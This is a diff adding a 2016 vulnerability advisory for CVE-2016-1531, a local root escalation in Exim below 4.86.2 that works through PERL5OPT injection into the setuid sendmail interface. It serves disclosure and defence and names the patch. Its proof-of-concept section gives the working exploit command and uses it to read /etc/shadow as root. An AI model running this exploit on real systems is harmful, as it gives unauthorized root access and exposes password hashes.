@@ -1,0 +1,200 @@
+=============================================
+- Release date: 10.03.2016
+- Discovered by: Dawid Golunski
+- Severity: High
+=============================================
+
+# Exploit Title: Exim < 4.86.2 Local Root Privilege Escalation
+# Google Dork: [if applicable]
+# Date: 10.03.2016
+# Exploit Author: Dawid Golunski
+# Vendor Homepage: www.exim.org
+# Version: [app version] < 4.86.2
+# Tested on: CentOS
+# CVE : CVE-2016-1531
+
+I. VULNERABILITY
+-------------------------
+
+Exim < 4.86.2        Local Root Privilege Escalation
+
+
+II. BACKGROUND
+-------------------------
+
+"Exim is a message transfer agent (MTA) developed at the University of 
+Cambridge for use on Unix systems connected to the Internet. It is freely 
+available under the terms of the GNU General Public Licence. In style it is 
+similar to Smail 3, but its facilities are more general. There is a great 
+deal of flexibility in the way mail can be routed, and there are extensive 
+facilities for checking incoming mail. Exim can be installed in place of 
+Sendmail, although the configuration of Exim is quite different."
+
+http://www.exim.org/
+
+
+III. INTRODUCTION
+-------------------------
+
+When Exim installation has been compiled with Perl support and contains a 
+perl_startup configuration variable it can be exploited by malicious local 
+attackers to gain root privileges.
+
+IV. DESCRIPTION
+-------------------------
+
+The vulnerability stems from Exim in versions below 4.86.2 not performing 
+sanitization of the environment before loading a perl script defined
+with perl_startup setting in exim config.
+
+perl_startup is usually used to load various helper scripts such as
+mail filters, gray listing scripts, mail virus scanners etc.
+
+For the option to be supported, exim must have been compiled with Perl 
+support, which can be verified with:
+
+[dawid@centos7 ~]$ exim -bV -v | grep i Perl
+Support for: crypteq iconv() IPv6 PAM Perl Expand_dlfunc TCPwrappers OpenSSL 
+Content_Scanning DKIM Old_Demime PRDR OCSP
+
+
+To perform the attack, attacker can take advantage of the exim's sendmail 
+interface which links to an exim binary that has an SUID bit set on it by 
+default as we can see below:
+
+[dawid@centos7 ~]$ ls -l /usr/sbin/sendmail.exim 
+lrwxrwxrwx. 1 root root 4 Nov 30 00:45 /usr/sbin/sendmail.exim -> exim
+
+[dawid@centos7 ~]$ ls -l /usr/sbin/exim
+-rwsr-xr-x. 1 root root 1222416 Dec  7  2015 /usr/sbin/exim
+
+
+Normally, when exim sendmail interface starts up, it drops its root
+privileges before giving control to the user (i.e entering mail contents for
+sending etc), however an attacker can make use of the following command line 
+parameter which is available to all users:
+
+-ps    This  option  applies when an embedded Perl interpreter is linked with 
+       Exim. It overrides the setting of the perl_at_start option, forcing the 
+       starting of the interpreter to occur as soon as Exim is started.
+
+
+As we can see from the documentation at:
+
+http://www.exim.org/exim-html-current/doc/html/spec_html/ch-embedded_perl.html
+
+the perl_at_start option does the following:
+
+"Setting perl_at_start (a boolean option) in the configuration requests a 
+startup when Exim is entered."
+
+Therefore it is possible to force the execution of the perl_startup script
+defined in the Exim's main config before exim drops its root privileges.
+
+
+To exploit this setting and gain the effective root privilege of the SUID binary,
+attackers can inject PERL5OPT perl environment variable, which does not get
+cleaned by affected versions of Exim.
+
+As per perl documentation, the environment variable allows to set perl command-line 
+options (switches). Switches in this variable are treated as if they were on every
+Perl command line. 
+
+There are several interesting perl switches that that could be set by attackers to 
+trigger code execution. 
+One of these is -d switch which forces perl to enter an interactive debug mode 
+in which it is possible to take control of the perl application.
+
+An example proof of concept exploitation using the -d switch can be found below.
+
+
+V. PROOF OF CONCEPT
+-------------------------
+
+[dawid@centos7 ~]$ head /etc/exim/exim.conf 
+######################################################################
+#                  Runtime configuration file for Exim               #
+######################################################################
+
+# Custom filtering via perl
+perl_startup = do '/usr/share/exim4/exigrey.pl'
+
+[dawid@centos7 ~]$ exim -bV -v | grep -i Perl
+Support for: crypteq iconv() IPv6 PAM Perl Expand_dlfunc TCPwrappers OpenSSL Content_Scanning DKIM Old_Demime PRDR OCSP
+
+[dawid@centos7 ~]$ PERL5OPT="-d/dev/null" /usr/sbin/sendmail.exim -ps victim@localhost
+
+Loading DB routines from perl5db.pl version 1.37
+Editor support available.
+
+Enter h or 'h h' for help, or 'man perldebug' for more help.
+
+Debugged program terminated.  Use q to quit or R to restart,
+  use o inhibit_exit to avoid stopping after program termination,
+  h q, h R or h o to get additional info.  
+
+  DB<1> p system("id");
+uid=0(root) gid=10(wheel) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+0
+  DB<2> p system("head /etc/shadow");
+root:$5$afgjO3wQeqHpAYF7$TmL0[...]AYAAvbA:16682:0:99999:7:::
+bin:*:16372:0:99999:7:::
+daemon:*:16372:0:99999:7::
+[...]
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+This vulnerability could be exploited by attackers who have local access to the
+system to escalate their privileges to root which would allow them to fully
+compromise the system.
+
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Exim versions before the latest patched version of Exim 4.86.2 are be
+affected by this vulnerability, if Exim was compiled with Perl 
+support and the main configuration file (i.e /etc/exim/exim.conf or 
+/etc/exim4/exim.conf), contains a perl_startup option e.g:
+
+perl_startup = do '/usr/share/exim4/exigrey.pl'
+
+It is important to note that the file does not necessarily have to exist
+to exploit the vulnerability. Although the path must be specified.
+
+
+VIII. SOLUTION
+-------------------------
+
+Update to Exim 4.86.2 which contains the official patch that fixes the
+environment sanitization issues.
+
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com/advisories/Exim-Local-Root-Privilege-Escalation.txt
+
+http://www.exim.org/
+http://www.exim.org/static/doc/CVE-2016-1531.txt
+http://www.exim.org/exim-html-current/doc/html/spec_html/ch-embedded_perl.html
+
+X. ADVISORY CREATED BY
+-------------------------
+
+This advisory has been created by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+
+XI. REVISION HISTORY
+-------------------------
+
+March 10th, 2016:  Advisory released
+
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+
